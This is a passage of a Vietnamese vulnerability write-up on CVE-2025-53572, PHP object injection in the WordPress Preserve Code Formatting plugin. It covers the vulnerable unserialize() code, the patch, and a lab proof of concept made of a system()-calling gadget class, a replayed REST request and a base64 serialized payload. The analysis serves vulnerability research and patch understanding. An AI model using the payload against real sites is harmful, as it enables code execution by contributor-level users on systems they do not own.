1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Lỗ hổng &lt;strong&gt;Deserialization of Untrusted Data&lt;/strong&gt; trong Scott Reilly &lt;strong&gt;Preserve Code Formatting&lt;/strong&gt; &lt;em&gt;preserve-code-formatting&lt;/em&gt; cho phép &lt;strong&gt;Object Injection&lt;/strong&gt;. Vấn đề này ảnh hưởng đến &lt;strong&gt;Preserve Code Formatting&lt;/strong&gt;: từ &lt;code&gt;n/a&lt;/code&gt; đến &amp;lt;= &lt;code&gt;4.0.1&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-53572&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-53572&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: PHP Object Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 4.0.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 5.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (8.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/preserve-code-formatting/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Preserve Code Formatting Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Preserve Code Formatting&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;4.0.1&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;5.0&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; hoặc bất kỳ công cụ diff nào.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Trong phiên bản lỗi (v4.0.1):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$data = unserialize( str_replace( $this-&amp;gt;chunk_split_token, &amp;#39;&amp;#39;, stripslashes( base64_decode( $match[2] ) ) ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong đoạn mã này, hàm &lt;strong&gt;&lt;code&gt;unserialize()&lt;/code&gt;&lt;/strong&gt; được gọi trực tiếp trên dữ liệu người dùng (&lt;code&gt;$match[2]&lt;/code&gt; sau khi giải mã base64). Điều này tạo ra lỗ hổng nghiêm trọng:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Nguy cơ Object Injection&lt;/strong&gt;: Nếu attacker chèn payload PHP object vào dữ liệu base64, quá trình decode và unserialize sẽ khởi tạo object độc hại, dẫn đến &lt;strong&gt;Object Injection&lt;/strong&gt; và có khả năng tiến tới &lt;strong&gt;Remote Code Execution (RCE)&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Thiếu kiểm tra an toàn&lt;/strong&gt;: Không có bước xác thực dữ liệu trước khi thực hiện unserialize.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Không có cơ chế fallback&lt;/strong&gt;: Nếu dữ liệu không hợp lệ hoặc bị lỗi, hệ thống không có phương án xử lý thay thế, khiến ứng dụng dễ bị khai thác.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;Bản vá (v5.0):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-20-cve-2025-49386/diff.png&#34; title=&#34;Sự thay đổi của bản vá&#34; data-thumbnail=&#34;/posts/2025-11-20-cve-2025-49386/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;Sự thay đổi của bản vá&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-20-cve-2025-49386/diff.png&#39; alt=&#34;Diff&#34; height=&#34;798&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Sự thay đổi của bản vá&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Thay thế &lt;code&gt;unserialize()&lt;/code&gt; bằng &lt;code&gt;json_decode()&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$decoded_data = str_replace( $this-&amp;gt;chunk_split_token, &amp;#39;&amp;#39;, stripslashes( base64_decode( $matches[2] ) ) );&#xA;if ( ! $this-&amp;gt;is_content_safe( $decoded_data ) ) {&#xA;    return $matches[0];&#xA;}&#xA;$data = json_decode( $decoded_data, true );&#xA;if ( $data === null &amp;amp;&amp;amp; json_last_error() !== JSON_ERROR_NONE ) {&#xA;    $data = $decoded_data;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Không còn dùng &lt;code&gt;unserialize()&lt;/code&gt; → loại bỏ hoàn toàn khả năng &lt;code&gt;PHP Object Injection&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin đã đăng ký một filter:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;add_filter( &amp;#39;content_save_pre&amp;#39;, array( $this, &amp;#39;preserve_postprocess&amp;#39; ), 100 );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Hook &lt;code&gt;content_save_pre&lt;/code&gt;: được gọi trước khi nội dung bài viết được lưu vào cơ sở dữ liệu. Đây là thời điểm thích hợp để can thiệp, chỉnh sửa hoặc lọc nội dung.&lt;/p&gt;&#xA;&lt;p&gt;Khi filter được kích hoạt thì callback &lt;code&gt;preserve_postprocess&lt;/code&gt; được gọi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function preserve_postprocess( $content, $preserve = false ) {&#xA;    $options                    = $this-&amp;gt;get_options();&#xA;    $preserve_tags              = (array) $options[&amp;#39;preserve_tags&amp;#39;];&#xA;    $wrap_multiline_code_in_pre = (bool)  $options[&amp;#39;wrap_multiline_code_in_pre&amp;#39;];&#xA;    $result                     = &amp;#39;&amp;#39;;&#xA;&#xA;    foreach ( $preserve_tags as $tag ) {&#xA;        if ( $result ) {&#xA;            $content = $result;&#xA;            $result = &amp;#39;&amp;#39;;&#xA;        }&#xA;&#xA;        $codes = preg_split( &amp;#34;/(\\{\\!\\{{$tag}[^\\]]*\\}\\!\\}.*\\{\\!\\{\\/{$tag}\\}\\!\\})/Us&amp;#34;, $content, -1, PREG_SPLIT_DELIM_CAPTURE );&#xA;&#xA;        foreach ( $codes as $code ) {&#xA;            if ( preg_match( &amp;#34;/\\{\\!\\{({$tag}[^\\]]*)\\}\\!\\}(.*)\\{\\!\\{\\/{$tag}\\}\\!\\}/Us&amp;#34;, $code, $match ) ) {&#xA;                // Note: base64_decode is only being used to decode user-supplied content of code tags which&#xA;                // had been encoded earlier in the filtering process to prevent modification by WP.&#xA;                $data = unserialize( str_replace( $this-&amp;gt;chunk_split_token, &amp;#39;&amp;#39;, stripslashes( base64_decode( $match[2] ) ) ) );&#xA;                if ( $preserve ) {&#xA;                    $data = $this-&amp;gt;preserve_code_formatting( $data );&#xA;                }&#xA;                $code = &amp;#34;&amp;lt;{$match[1]}&amp;gt;$data&amp;lt;/$tag&amp;gt;&amp;#34;;&#xA;                if ( $preserve &amp;amp;&amp;amp; $wrap_multiline_code_in_pre &amp;amp;&amp;amp; ( &amp;#39;pre&amp;#39; != $tag ) &amp;amp;&amp;amp; preg_match( &amp;#34;/\n/&amp;#34;, $data ) ) {&#xA;                    $code = &amp;#39;&amp;lt;pre&amp;gt;&amp;#39; . $code . &amp;#39;&amp;lt;/pre&amp;gt;&amp;#39;;&#xA;                }&#xA;            }&#xA;            $result .= $code;&#xA;        }&#xA;    }&#xA;&#xA;    return $result;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Đặt breakpoint vào đầu hàm &lt;code&gt;preserve_postprocess()&lt;/code&gt;, thử tạo một post bất kỳ:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/wp/v2/posts/129?_locale=user HTTP/1.1&#xA;Host: localhost&#xA;Cookie: wp-settings-time-3=1763365761; wordpress_test_cookie=WP%20Cookie%20check; wordpress_logged_in_86a9106ae65537651a8e456835b316ab=con%7C1763781752%7CrF6XPHmgOzitm7TUKbUcETuuvC9pvGNPsT8bVNxQqoq%7Ce8636ff63b4bdcb466fcd689a839fd0442c9a94b6124977d2dd911a0c0fbf0de; wp-settings-2=libraryContent%3Dbrowse; wp-settings-time-2=1763608953&#xA;...&#xA;{&amp;#34;id&amp;#34;:129,&amp;#34;content&amp;#34;:&amp;#34;&amp;lt;!-- wp:paragraph --&amp;gt;\n&amp;lt;p&amp;gt;Payload&amp;lt;/p&amp;gt;\n&amp;lt;!-- /wp:paragraph --&amp;gt;&amp;#34;,&amp;#34;title&amp;#34;:&amp;#34;Test&amp;#34;,&amp;#34;status&amp;#34;:&amp;#34;pending&amp;#34;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-20-cve-2025-49386/content.png&#34; title=&#34;Giá trị của $content&#34; data-thumbnail=&#34;/posts/2025-11-20-cve-2025-49386/content.png&#34; data-sub-html=&#34;&lt;h2&gt;Content&lt;/h2&gt;&lt;p&gt;Giá trị của $content&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-20-cve-2025-49386/content.png&#39; alt=&#34;Content&#34; height=&#34;579&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Giá trị của $content&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Ta thấy &lt;code&gt;$content&lt;/code&gt; sẽ tương ứng với giá trị của &lt;code&gt;&amp;quot;content&amp;quot;&lt;/code&gt; ta truyền khi tạo post.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$codes = preg_split(&#xA;    &amp;#34;/(\{\!\{{$tag}[^\]]*\}\!\}.*\{\!\{\/{$tag}\}\!\})/Us&amp;#34;,&#xA;    $content,&#xA;    -1,&#xA;    PREG_SPLIT_DELIM_CAPTURE&#xA;);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Biểu thức chính quy trên dùng để tìm đoạn mở thẻ &lt;code&gt;{!{$tag}...}!}&lt;/code&gt; và đóng thẻ &lt;code&gt;{!{/$tag}!}&lt;/code&gt; cùng nội dung bên trong. Tham số &lt;code&gt;PREG_SPLIT_DELIM_CAPTURE&lt;/code&gt; giúp giữ lại cả đoạn khớp trong mảng kết quả.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-20-cve-2025-49386/tag.png&#34; title=&#34;Giá trị của $tag&#34; data-thumbnail=&#34;/posts/2025-11-20-cve-2025-49386/tag.png&#34; data-sub-html=&#34;&lt;h2&gt;Tag&lt;/h2&gt;&lt;p&gt;Giá trị của $tag&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-20-cve-2025-49386/tag.png&#39; alt=&#34;Tag&#34; height=&#34;509&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Giá trị của $tag&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Nếu &lt;code&gt;$tag&lt;/code&gt; là &lt;code&gt;code&lt;/code&gt; hoặc &lt;code&gt;pre&lt;/code&gt; thì sẽ tách được các khối preserve, còn nếu không khớp thì kết quả trả về chỉ là chính chuỗi &lt;code&gt;$content&lt;/code&gt; ban đầu.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( preg_match( &amp;#34;/\\{\\!\\{({$tag}[^\\]]*)\\}\\!\\}(.*)\\{\\!\\{\\/{$tag}\\}\\!\\}/Us&amp;#34;, $code, $match ) ) { ... }&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;preg_match()&lt;/code&gt; kiểm tra xem &lt;code&gt;$code&lt;/code&gt; có chứa thẻ preserve mở &lt;code&gt;{!{$tag}...}!}&lt;/code&gt; và đóng &lt;code&gt;{!{/{$tag}}!}&lt;/code&gt; hay không. Nếu khớp, &lt;code&gt;$match[1]&lt;/code&gt; là tên thẻ/thuộc tính, &lt;code&gt;$match[2]&lt;/code&gt; là nội dung bên trong.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-20-cve-2025-49386/match.png&#34; title=&#34;Giá trị của $match&#34; data-thumbnail=&#34;/posts/2025-11-20-cve-2025-49386/match.png&#34; data-sub-html=&#34;&lt;h2&gt;Match&lt;/h2&gt;&lt;p&gt;Giá trị của $match&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-20-cve-2025-49386/match.png&#39; alt=&#34;Match&#34; height=&#34;615&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Giá trị của $match&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$data = unserialize( str_replace( $this-&amp;gt;chunk_split_token, &amp;#39;&amp;#39;, stripslashes( base64_decode( $match[2] ) ) ) );&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Cuối cùng, giá trị của &lt;code&gt;$match[2]&lt;/code&gt; sẽ được decode base64, loại bỏ ký tự escape bằng &lt;code&gt;stripslashes()&lt;/code&gt;, xóa token và &lt;code&gt;unserialize()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Thông tin&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;Đúng với mô tả của CVE, để khai thác ta cần đặc quyền &lt;strong&gt;Contributor&lt;/strong&gt; dành cho việc tạo bài viết.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;&#xA;A[&amp;#34;Contributor submits Post&#xA;(Content contains malicious Base64 payload)&amp;#34;]&#xA;    --&amp;gt; B[&amp;#34;WordPress calls hook: content_save_pre&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;Plugin callback: preserve_postprocess()&amp;#34;]&#xA;&#xA;C --&amp;gt; D[&amp;#34;Regex extracts preserve blocks&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;match[2] = Base64 payload&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;base64_decode()&amp;#34;]&#xA;F --&amp;gt; G[&amp;#34;stripslashes()&amp;#34;]&#xA;G --&amp;gt; H[&amp;#34;str_replace(chunk_split_token)&amp;#34;]&#xA;&#xA;H --&amp;gt; I[&amp;#34;unserialize() on user data (VULNERABLE)&amp;#34;]&#xA;&#xA;I --&amp;gt; J[RCE]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Tạo class để test đặt trong &lt;code&gt;wp-config.php&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;class Evil&#xA;{&#xA;    public $command = &amp;#34;ls /&amp;#34;;&#xA;    public function __destruct()&#xA;    {&#xA;        die(system($this-&amp;gt;command));&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Tạo post, cho request đi qua proxy của BurpSuite&lt;/li&gt;&#xA;&lt;li&gt;Gửi lại request với &lt;code&gt;&amp;quot;content&amp;quot;&lt;/code&gt; là chuỗi serialized được encode base64&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;{&amp;#34;id&amp;#34;:129,&amp;#34;content&amp;#34;:&amp;#34;{!{code}!}Tzo0OiJFdmlsIjoxOntzOjc6ImNvbW1hbmQiO3M6NDoibHMgLyI7fQ=={!{/code}!}&amp;#34;,&amp;#34;title&amp;#34;:&amp;#34;Test&amp;#34;,&amp;#34;status&amp;#34;:&amp;#34;pending&amp;#34;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-20-cve-2025-49386/result.png&#34; title=&#34;Kết quả&#34; data-thumbnail=&#34;/posts/2025-11-20-cve-2025-49386/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Kết quả&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-20-cve-2025-49386/result.png&#39; alt=&#34;Result&#34; height=&#34;841&#34; width=&#34;1479&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Kết quả&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h1&gt;&lt;p&gt;Phiên bản &lt;code&gt;&amp;lt;= 4.0.1&lt;/code&gt; của plugin Preserve Code Formatting mắc lỗi nghiêm trọng khi sử dụng &lt;code&gt;unserialize()&lt;/code&gt; trên dữ liệu đầu vào không được xác thực, cho phép đối tượng PHP tùy ý được khởi tạo trong quá trình xử lý nội dung bài viết. Chỉ cần quyền Contributor, kẻ tấn công có thể đưa payload vào nội dung post, dẫn đến thực thi mã từ xa hoặc thao tác trái phép trên hệ thống. Bản vá &lt;code&gt;v5.0&lt;/code&gt; đã loại bỏ hoàn toàn việc dùng &lt;code&gt;unserialize()&lt;/code&gt;, thay thế bằng &lt;code&gt;json_decode()&lt;/code&gt; và bổ sung bước kiểm tra tính an toàn, từ đó triệt tiêu lỗ hổng Object Injection.&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 